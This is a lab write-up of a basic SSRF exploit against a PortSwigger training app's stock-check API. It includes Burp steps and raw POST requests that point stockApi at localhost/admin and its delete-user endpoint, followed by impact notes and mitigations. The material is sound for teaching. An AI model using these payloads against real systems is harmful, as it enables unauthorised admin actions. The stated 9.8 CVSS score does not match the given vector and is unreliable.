# Title: Server-Side Request Forgery (SSRF) via Stock Check API

# **Description**

The application provides a stock check feature that allows users to check the availability of products. When a user clicks the "Check stock" button, the frontend application makes a request to a backend API that fetches stock information from an internal system. The backend API uses a user-supplied URL to retrieve this information.

However, the application fails to properly validate or restrict the URLs that can be requested through the stock check feature. The `stockApi` parameter accepts any URL and makes a server-side request to that location without proper validation. This allows an attacker to perform Server-Side Request Forgery (SSRF) attacks.

By manipulating the `stockApi` parameter, an attacker can make the server send requests to internal systems that are not directly accessible from the internet. This includes internal services like `localhost` (the server itself), internal network services, and administrative interfaces. In this case, the attacker can access the admin panel at `http://localhost/admin` and perform privileged actions like deleting user accounts.

# **Steps to Exploit**

1. Navigate to a product page on the application (e.g., a product with ID 1).
2. Click the "Check stock" button to trigger a stock check request.
3. In Burp Suite, intercept the request and observe the `POST /product/stock` request.
4. Examine the request body and notice the `stockApi` parameter containing the URL to the internal stock API.
5. Send this request to Burp Repeater for manipulation.
6. In Burp Repeater, change the `stockApi` parameter from the original URL to `http://localhost/admin`.
7. Send the request and observe the response containing the admin panel HTML.
8. Examine the response HTML to find the URL for deleting the user `carlos`.
9. Locate the delete endpoint: `http://localhost/admin/delete?username=carlos`.
10. Change the `stockApi` parameter to `http://localhost/admin/delete?username=carlos`.
11. Send the request to deliver the SSRF attack and delete the user.
12. The lab is solved when Carlos is successfully deleted.

# **Proof of Concept**

**Step 1 – Original stock check request:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock-service.example.com/api/stock/1
```

**Step 2 – Access admin panel via SSRF:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

**Step 3 – Response containing admin panel HTML:**
```html
<html>
  <body>
    <h1>Admin Panel</h1>
    <a href="/admin/delete?username=carlos">Delete Carlos</a>
  </body>
</html>
```

**Step 4 – Delete carlos via SSRF:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```
![[SST/T12/App Sec/Port Swigger Writeups/SSRF/Screenshots/1.png]]



![[SST/T12/App Sec/Port Swigger Writeups/SSRF/Screenshots/2.png]]


![[SST/T12/App Sec/Port Swigger Writeups/SSRF/Screenshots/3.png]]

![[SST/T12/App Sec/Port Swigger Writeups/SSRF/Screenshots/4.png]]

![[SST/T12/App Sec/Port Swigger Writeups/SSRF/Screenshots/5.png]]

# **Impact**

The SSRF vulnerability in the stock check feature has severe security implications:

**Internal Network Access:**
- Attackers can access internal systems and services not exposed to the internet.
- This includes administrative interfaces, databases, and other sensitive services.

**Privilege Escalation:**
- Attackers can access administrative interfaces that are only available internally.
- This allows performing privileged actions like user deletion.

**Data Exposure:**
- Internal services may expose sensitive information.
- This can include configuration files, credentials, and user data.

**Internal Service Discovery:**
- Attackers can scan internal networks to discover running services.
- This information can be used for further attacks.

**System Compromise:**
- Access to internal services may lead to complete system compromise.
- This includes file uploads, command execution, and database manipulation.

**Cloud Environment Risks:**
- In cloud environments, SSRF can access metadata services (e.g., AWS metadata at `169.254.169.254`).
- This can expose cloud credentials and lead to cloud account compromise.

# **Mitigation / Remediation**

1. **Validate and Sanitize URLs:**
   - Validate that the URL is a legitimate internal service URL.
   - Use whitelisting to restrict allowed URLs and domains.

2. **Implement URL Allowlisting:**
   - Only allow URLs that match a specific pattern (e.g., `http://stock-service.example.com/*`).
   - Reject any URLs that contain internal IPs or `localhost`.

3. **Restrict Internal Access:**
   - Limit the internal services that can be accessed from the application.
   - Use network segmentation to isolate internal services.

4. **Implement Access Controls:**
   - Require authentication for internal services.
   - Use different credentials for internal and external access.

5. **Disable URL Redirection:**
   - Prevent the application from following redirects.
   - Validate the final URL before making the request.

6. **Regular Security Audits:**
   - Conduct regular penetration testing to identify SSRF vulnerabilities.
   - Review all internal service access patterns.

# **CVSS Justification**

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | Exploited remotely via standard HTTP requests |
| Attack Complexity | Low | Changing a URL parameter requires minimal technical skill |
| Privileges Required | None | No authentication is required for the stock check |
| User Interaction | None | The exploit works without user interaction |
| Scope | Changed | Attacker gains access to internal systems |
| Confidentiality Impact | High | Internal services and data are exposed |
| Integrity Impact | High | The attacker can perform administrative actions |
| Availability Impact | High | User accounts can be deleted or modified |

**CVSS Score: 9.8 (Critical)**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

This critical score reflects the severe nature of the vulnerability, which allows complete access to internal systems and administrative functions with minimal effort and no authentication requirements.